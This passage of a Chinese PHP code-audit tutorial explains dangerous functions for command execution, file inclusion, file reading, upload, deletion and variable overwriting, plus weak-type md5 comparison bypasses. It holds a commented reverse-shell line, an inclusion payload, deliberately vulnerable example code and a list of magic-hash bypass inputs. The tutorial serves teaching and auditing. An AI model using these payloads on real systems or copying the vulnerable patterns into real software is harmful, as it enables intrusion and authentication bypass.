<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">一、</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    passthru(<span class="string">'whoami'</span>);	<span class="comment">//直接将结果返回到页面</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">二、</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    passthru(<span class="string">'whoami'</span>,$result);	<span class="comment">//将结果返回到一个变量，然后通过输出变量值得到输出内容</span></span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>在当前进程空间执行指定程序。关键点就在于进程空间，倘若我现在设定一个条件，你只有在某个子进程中才能读取phpinfo，那这个时候，我们就需要用到这个函数了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pcntl_exec( string $path[, <span class="keyword">array</span> $args[, <span class="keyword">array</span> $envs]] ) : void</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>path：path必须时可执行二进制文件路径或在一个文件第一行指定了一个可执行文件路径标头的脚本(比如文件第一行是#!/usr/local/bin/perl的perl脚本)</li>
<li>args：此参数是一个传递给程序的参数的字符串数组</li>
<li>envs：环境变量，这个想必大家都很熟悉，只不过这里强调一点，这里传入的是数组，数组格式是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。</li>
</ul>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//father</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	pcntl_exec(<span class="string">'/usr/local/bin/php'</span>, [<span class="string">'2.php'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//son</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>此函数使用command参数打开进程文件指针。如果出错，那么该函数就会返回FALSE。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">popen(command,mode)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：要执行的命令</li>
<li>mode：必需。规定连接的模式<ul>
<li>r：只读</li>
<li>w：只写（打开并清空已有文件或创建一个新文件）</li>
</ul>
</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = popen(<span class="string">"demo.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">	pclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = popen(<span class="string">"/bin/ls"</span>,<span class="string">"r"</span>);</span><br><span class="line"><span class="comment">//some code to be executed</span></span><br><span class="line">pclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h4><p>此函数执行一个命令，并且打开用来输入或者输出的文件指针</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">proc_open( string $cmd, <span class="keyword">array</span> $descriptorspec, <span class="keyword">array</span> &amp;$pipes[, string $cwd = <span class="keyword">NULL</span>[, <span class="keyword">array</span> $env = <span class="keyword">NULL</span>[, <span class="keyword">array</span> $other_options = <span class="keyword">NULL</span>]]] )</span><br></pre></td></tr></table></figure>

<p>此函数其实和<code>popen</code>函数类似，都是执行命令</p>
<p>参数 </p>
<ul>
<li>cmd：要执行的命令</li>
<li>descriptorspec：索引数组。数组中的键值表示描述符，元素值表示 PHP 如何将这些描述符传送至子进程。0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。</li>
<li>pipes：将被置为索引数组，其中的元素是被执行程序创建的管道对应到PHP这一段的文件指针。</li>
<li>cwd：要执行命令的初始工作目录。必需是绝对路径。此参数默认使用 NULL（表示当前 PHP 进程的工作目录）</li>
<li>env。要执行命令所使用的环境变量。此参数默认为 NULL（表示和当前 PHP 进程相同的环境变量）</li>
<li>other_options：可选。附加选项<ul>
<li>suppress_errors （仅用于 Windows 平台）：设置为 TRUE 表示抑制本函数产生的错误。</li>
<li>bypass_shell （仅用于 Windows 平台）：设置为 TRUE 表示绕过 cmd.exe shell。</li>
</ul>
</li>
</ul>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><code>include</code>将会包含语句并执行指定文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'filename'</span>;</span><br></pre></td></tr></table></figure>

<p>关键点就在于执行指定文件，执行给了我们代码执行的机会。倘若此时我们构造了一个后门文件，需要在目标机器执行进行shell反弹，那么如果代码中有<code>include</code>而且没有进行过滤，那么我们就可以使用该函数来执行我们的后门函数。演示如下。</p>
<p>示例代码(1.php)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>示例代码(2.php)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//这里可以使用PHP来反弹shell，我这里只是演示</span></span><br><span class="line">	<span class="comment">//$sock=fsockopen("127.0.0.1",4444);exec("bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;h1&gt;[*]backdoor is running!&lt;/h1&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">payload：<span class="number">1.</span>php?file=<span class="number">2.</span>php</span><br></pre></td></tr></table></figure>

<h4 id="include-once"><a href="#include-once" class="headerlink" title="include_once()"></a>include_once()</h4><p><code>include_once</code>与<code>include</code>没有太大区别，唯一的其区别已经在名称中体现了，就是相同的文件只包含一次。其他功能和<code>include_once</code>一样，只是增加对每个文件包含的次数。</p>
<h4 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h4><p><code>require</code>的实现和<code>include</code>功能几乎完全相同，那既然一样为什么还要多一个这样的函数呢？( 我也不知道)</p>
<p>其实两者还是有点区别的，什么区别呢？这么说，如果你包含的文件的代码里面有错误，你觉得会发生什么？是继续执行包含的文件，还是停止执行呢？所以区别就在这里产生了。</p>
<p><code>require</code>在出错时会导致脚本终止，而<code>include</code>在出错时只是发生警告，脚本还是继续执行。</p>
<h4 id="require-once"><a href="#require-once" class="headerlink" title="require_once()"></a>require_once()</h4><p>这两者关系和<code>include</code>与<code>include_once</code>的关系是一样的。</p>
<h3 id="文件读取-下载"><a href="#文件读取-下载" class="headerlink" title="文件读取(下载)"></a>文件读取(下载)</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><p>函数功能是将整个文件读入一个字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_get_contents(path,include_path,context,start,max_length)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：要读取文件的名称。</li>
<li>include_path：可选。如果也想在 include_path 中搜索文件，可以设置为1。</li>
<li>context：可选。规定句柄的位置。</li>
<li>start：可选。规定文件中开始读取的位置。</li>
<li>max_length：可选。规定读取的字节数。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'demo.txt'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h4><p>此函数将打开一个文件或URL，如果 fopen() 失败，它将返回 FALSE 并附带错误信息。我们可以通过在函数名前面添加一个 <code>@</code> 来隐藏错误输出。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fopen(filename,mode,include_path,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：必需。要打开的文件或URL</li>
<li>mode：必需。规定访问类型（例如只读，只写，读写方式等，方式的规定和其他语言的规定方式一致）</li>
<li>include_path：可选。就是你可以指定搜索的路径位置，如果要指定的话，那么该参数要指定为1</li>
<li>context：可选。规定句柄的环境。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = fopen(<span class="string">"demo.txt"</span>,<span class="string">"rb"</span>);</span><br><span class="line">	$content = fread($file,<span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">echo</span> $content;</span><br><span class="line">	fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码中其实也包含了<code>fread</code>的用法。因为<code>fread</code>仅仅只是打开一个文件，要想读取还得需要用到<code>fread</code>来读取文件内容。</p>
<h4 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h4><p>这个函数刚才在上个函数中基本已经演示过了，就是读取文件内容。这里代码就不再演示了，简单介绍一下参数和用法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string fread ( resource $handle , int $length )</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>handle：文件系统指针，是典型地由 <code>fopen</code>创建的<code>resource</code>。</li>
<li>length：必需。你要读取的最大字节数。</li>
</ul>
<h4 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h4><p>从打开的文件中读取一行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fgets(file,length)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。规定要读取的文件。</li>
<li>length：可选。规定要读取的字节数。默认是1024字节。</li>
</ul>
<p>可以看出这个函数和之前的fread区别不是很大，只不过这个读取的是一行。</p>
<h4 id="fgetss"><a href="#fgetss" class="headerlink" title="fgetss()"></a>fgetss()</h4><p>这个函数跟上个没什么差别，也是从打开的文件中读取去一行，只不过过滤掉了 HTML 和 PHP 标签。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fgetss(file,length,tags)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。要检查的文件。</li>
<li>length：可选。规定要读取的字节数，默认1024字节。</li>
<li>tags：可选。哪些标记不去掉。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = fopen(<span class="string">"demo.html"</span>,<span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">echo</span> fgetss($file);</span><br><span class="line">	fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h4><p>这个函数从名称基本就知道它是干啥的了，读文件用的。此函数将读取一个文件，并写入到输出缓冲中。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：必需。要读取的文件。</li>
<li>include_path：可选。规定要搜索的路径。</li>
<li>context：可选。规定文件句柄环境。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span> . readfile(<span class="string">"demo.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h4><p>把文件读入到一个数组中，数组中每一个元素对应的是文件中的一行，包括换行符。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file(path,include_path,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>path：必需。要读取的文件。</li>
<li>include_path：可选。可指定搜索路径。</li>
<li>context：可选。设置句柄环境。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(file(<span class="string">"demo.txt"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="parse-ini-file"><a href="#parse-ini-file" class="headerlink" title="parse_ini_file()"></a>parse_ini_file()</h4><p>从名称可以看出，这个函数不是读取一个简单的文件。它的功能是解析一个配置文件(ini文件)，并以数组的形式返回其中的位置。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_ini_file(file,process_sections)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。要读取的ini文件</li>
<li>process_sections：可选。若为TRUE，则返回一个多维数组，包括了详细信息</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	print_r(parse_ini_file(<span class="string">"demo.ini"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="show-source-highlight-file"><a href="#show-source-highlight-file" class="headerlink" title="show_source()/highlight_file()"></a>show_source()/highlight_file()</h4><p>这两个函数没什么好说的，想必大家也经常见到这两个函数，其作用就是让php代码显示在页面上。这两个没有任何区别，<code>show_source</code>其实就是<code>highlight_file</code>的别名。</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file()"></a>move_uploaded_file()</h4><p>此函数是将上传的文件移动到新位置。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">move_uploaded_file(file,newloc)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。规定要移动的文件。</li>
<li>newloc：必需。规定文件的新位置。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$fileName = $_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].<span class="string">'/uploads/'</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$fileName )</span><br></pre></td></tr></table></figure>

<p>这段代码就是直接接收上传的文件，没有进行任何的过滤，那么当我们上传getshell的后门时，就可以直接获取权限，可见这个函数是不能乱用的，即便要用也要将过滤规则完善好，防止上传不合法文件。</p>
<h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink()"></a>unlink()</h4><p>此函数用来删除文件。成功返回 TURE ，失败返回 FALSE。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">unlink(filename,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：必需。要删除的文件。</li>
<li>context：可选。句柄环境。</li>
</ul>
<p>我们知道，一些网站是有删除功能的。比如常见的论坛网站，是有删除评论或者文章功能的。倘若网站没有对删除处做限制，那么就可能会导致任意文件删除（甚至删除网站源码）。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = <span class="string">"demo.txt"</span>;</span><br><span class="line">    <span class="keyword">if</span>(unlink($file))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"$file have been deleted"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"$file not exist?"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">php&gt;</span><br></pre></td></tr></table></figure>

<h4 id="session-destroy"><a href="#session-destroy" class="headerlink" title="session_destroy()"></a>session_destroy()</h4><p>在了解这个函数之前，我们需要先了解 PHP session。 PHP session 变量用于存储关于用户会话的信息。关于 sesson 的机制这里我就不再过于详细介绍。</p>
<p><code>session_destroy()</code>函数用来销毁一个会话中的全部数据，但并不会重置当前会话所关联的全局变量，同时也不会重置会话 cookie</p>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><h4 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h4><p>此函数从数组中将变量导入到当前的符号表。其实作用就是给变量重新赋值，从而达到变量覆盖的作用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">extract(<span class="keyword">array</span>,extract_rules,prefix)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>array：必需。规定要使用的数组。</li>
<li>extract_rules：可选。extract函数将检查每个键名是否为合法的变量名，同时也检查和符号中已经存在的变量名是否冲突，对不合法或者冲突的键名将会根据此参数的设定的规则来决定。<ul>
<li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</li>
<li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li>
<li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</li>
<li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。</li>
<li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。</li>
<li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li>
<li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li>
<li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li>
</ul>
</li>
<li>prefix：可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name = <span class="string">'cat'</span>;</span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">echo</span> $name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>参时如果我们POST传入name=dog，那么页面将会回显dog，说明这个函数的使用让我们实现了变量的覆盖，改变了变量的值。</p>
<h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h4><p>此函数把查询到的字符串解析到变量中。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str(string,<span class="keyword">array</span>)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>string：必需。规定要解析的字符串。</li>
<li>array：可选。规定存储变量的数组名称。该参数只是变量存储到数组中。代码示例：</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$name = <span class="string">'who'</span>;</span><br><span class="line">    $age = <span class="string">'20'</span>;</span><br><span class="line">    parse_str(<span class="string">"name=Ameng&amp;age=21"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$name, $age"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">Ameng, <span class="number">21</span></span><br></pre></td></tr></table></figure>

<p>通过上述代码，我们可以发现，变量name和age都发生了变化，被新的值覆盖了。这里我用的是 PHP 7.4.3 版本。发现这个函数的这个作用还是存在的，且没有任何危险提示。</p>
<h4 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h4><p>此函数将GET/POST/Cookie变量导入到全局作用域中。从而能够达到变量覆盖的作用。</p>
<p>版本要求：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">bool import_request_variables ( string $types [, string $prefix ] )</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>types：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。</li>
<li>prefix：变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name = <span class="string">'who'</span>;</span><br><span class="line">	import_request_variables(<span class="string">'gp'</span>);</span><br><span class="line">	<span class="keyword">if</span>($name == <span class="string">'Ameng'</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'You are not Ameng'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果什么变量也不传，那么页面将回显<code>You are not Ameng</code>如果通过GET或者POST传入<code>name=Ameng</code>那么页面就会回显<code>Ameng</code></p>
<p>可以见到此函数还是很危险的，没有修复方法，不使用就是最好的方法。所以在新版本的 PHP 中已经废弃了这个函数。</p>
<h4 id="foreach"><a href="#foreach" class="headerlink" title="foreach()"></a>foreach()</h4><p><code>foreach</code> 语法结构提供了遍历数组的简单方式。<code>foreach</code> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $value)</span><br><span class="line">    statement</span><br><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure>

<p>第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p>
<p>第二种格式做同样的事，只是除了当前单元的键名也会在每次循环中被赋给变量 $key。</p>
<p>那么这个函数如何实现变量的覆盖呢？我们来看个案例.</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name = <span class="string">'who'</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)	&#123;  </span><br><span class="line">            $$key = $value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span>($name == <span class="string">"Ameng"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are right!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are flase!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么执行结果是怎样的呢？当我们直接打开页面的时候它会输出<code>You are false!</code>,而当我们通过GET传参<code>name=Ameng</code>的时候，它会回显<code>You are right!</code>。那么这是为什么呢？我们来分析一下</p>
<p>关键点就在于<code>$$</code>这种写法。这种写法称为可变变量。一个变量能够获取一个普通变量的值作为这个可变变量的变量名。当使用<code>foreach</code>来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。这样就产生了变量覆盖漏洞，如上代码示例。其执行过程为<code>$$key</code>=<code>$name</code>，最后赋值为<code>$value</code>，从而实现了变量覆盖。</p>
<h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><h4 id="md5-函数和sha1-绕过"><a href="#md5-函数和sha1-绕过" class="headerlink" title="md5()函数和sha1()绕过"></a>md5()函数和sha1()绕过</h4><p>关于这两个函数想必我们不陌生，无论是在实际代码审计中，还是在CTF比赛中，这些我们都是碰到过的函数。那么当我们遇到用这两个函数来判断的时候，如果绕过呢？</p>
<p>PHP 在处理哈希字符串的时候，会使用<code>!=</code>或者<code>==</code>来对哈希值进行比较，它会把每一个<code>0E</code>开头的哈希值都解释为0，那么这个时候问题就来了，如果两个不同的值，经过哈希以后它们都变成了<code>0E</code>开头的哈希值，那么 PHP 就会将它们视作相等处理。那么<code>0E</code>开头的哈希值有哪些呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>

<p>来个简单的例子吧</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">	$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">	<span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'这就是弱类型绕过'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'再思考一下'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从上面我给出的哪些值中，挑两个不同的值传入参数，就能看到相应的结果</p>
<p>上面是<code>md5()</code>函数的绕过姿势，那么<code>sha1()</code>如何绕过呢？再来看一个简单的例子</p>
